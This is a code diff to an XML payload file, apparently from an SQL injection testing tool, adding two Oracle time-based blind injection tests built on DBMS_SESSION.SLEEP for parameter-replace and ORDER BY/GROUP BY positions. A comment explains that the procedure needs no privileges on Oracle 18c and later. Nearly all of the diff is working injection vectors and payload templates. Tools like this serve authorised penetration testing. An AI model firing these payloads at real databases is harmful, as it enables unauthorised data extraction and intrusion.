@@ -1776,6 +1776,26 @@
     </test>
 
     <!-- Without parentesis because it never works with them, useful to exploit SQL injection in Oracle E-Business Suite Financials -->
+    <!-- DBMS_SESSION.SLEEP is granted to PUBLIC on Oracle 18c+ (unlike DBMS_LOCK.SLEEP, which needs an explicit grant); tried first so modern targets get a no-privilege delay, falling back to DBMS_LOCK.SLEEP on older releases -->
+    <test>
+        <title>Oracle time-based blind - Parameter replace (DBMS_SESSION.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,3,9</clause>
+        <where>3</where>
+        <vector>BEGIN IF ([INFERENCE]) THEN DBMS_SESSION.SLEEP([SLEEPTIME]); ELSE DBMS_SESSION.SLEEP(0); END IF; END;</vector>
+        <request>
+            <payload>BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_SESSION.SLEEP([SLEEPTIME]); ELSE DBMS_SESSION.SLEEP(0); END IF; END;</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
     <test>
         <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
         <stype>5</stype>
@@ -2069,6 +2089,25 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_SESSION.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(BEGIN IF ([INFERENCE]) THEN DBMS_SESSION.SLEEP([SLEEPTIME]); ELSE DBMS_SESSION.SLEEP(0); END IF; END;)</vector>
+        <request>
+            <payload>,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_SESSION.SLEEP([SLEEPTIME]); ELSE DBMS_SESSION.SLEEP(0); END IF; END;)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
         </details>
     </test>
 
